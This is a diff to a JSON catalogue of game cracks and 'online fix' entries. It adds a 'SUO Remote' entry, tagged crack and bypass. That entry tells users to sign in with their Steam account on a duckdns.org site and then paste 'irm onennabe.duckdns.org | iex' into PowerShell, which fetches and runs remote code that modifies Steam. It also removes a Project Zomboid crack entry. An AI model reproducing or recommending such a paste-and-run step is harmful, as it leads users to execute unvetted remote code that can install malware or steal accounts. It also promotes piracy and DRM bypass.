@@ -1,5 +1,20 @@
 [
   {
+    "id": "suo-remote",
+    "appId": null,
+    "title": "SUO Remote",
+    "game": "SUO Remote",
+    "desc": "ONLINE ONLY, if you go OFFLINE, game will turn purchase.",
+    "tags": [
+      "crack",
+      "bypass"
+    ],
+    "author": "The Weekdys",
+    "version": "1.0",
+    "date": "2026-10-06",
+    "content": "\n# SUO Remote\n\n# Experimental features\n# ONLINE ONLY, if you go OFFLINE, game will turn purchase.\n**Remote game unlocking to your steam**\n\nGo to this website\nhttps://onennabe.duckdns.org/dashboard\n\n1. Sign in using your own steam account, it will auto detect of for existing user. (can be done on phone/tablet/macbook/iphone duo 1tb whichever u preferred).\n2. Then back to your PC/Desktop/Laptop/ whatever top you have.\n3. Open powershell , type powershell at start menu or WIN + R, type powershell \n4. Copy this ``irm onennabe.duckdns.org | iex``\n5. Paste in the powershell, press enter\n6. Steam will restart\n7. You can start using the website to unlock your game remotely, or you can go to the game store page, there will be \"UNLOCK VIA ONENNABE\" next to the Community Hub button. \n\nP/S:\n- Please take note, Unlocking game sometimes takes longer to appear in steam depend on your internet, its 15 seconds to 30 seconds\n- There is no auto update features.\n- Denuv0 games are excluded.\n- if the server crash, it's your fault.\n- No need to open SUO at all.\n- No, we do not store your login information and credentials, we just store your steamid64 to cross check with server for activation.\n\n![Attached Image](assets/suo-remote_1557071487213764788.webp)\n\n\n![Attached Image](assets/suo-remote_1557071488841027604.png)\n\n\n![Attached Image](assets/suo-remote_1557071490799632434.gif)\n\n\n![Attached Image](assets/suo-remote_1557071491437436970.gif)\n\n\n![Attached Image](assets/suo-remote_1557071493026811904.gif)\n"
+  },
+  {
     "id": "minecraft-dungeon-2-1912410",
     "appId": 1912410,
     "title": "Minecraft Dungeon 2 - 1912410",
@@ -273,19 +288,5 @@
     "version": "1.0",
     "date": "2026-08-11",
     "content": "\n# Biped Online Fix\n\n# Biped Online Fix\n\n### Instructions\n1. Install game\n2. Click \"ONLINE PATCH\"\n3. Run game from Steam or direct file exe\n"
-  },
-  {
-    "id": "project-zomboid-108600",
-    "appId": 108600,
-    "title": "Project Zomboid Online Fix",
-    "game": "Project Zomboid",
-    "desc": "Project Zomboid Online Fix",
-    "tags": [
-      "online"
-    ],
-    "author": "ProSub",
-    "version": "1.0",
-    "date": "2026-08-11",
-    "content": "\n# Project Zomboid Online Fix\n\n# Project Zomboid Online Fix\n\n### Instructions\n1. Install game\n2. Click \"ONLINE PATCH\"\n3. Run game from Steam or direct file exe\n"
   }
 ]
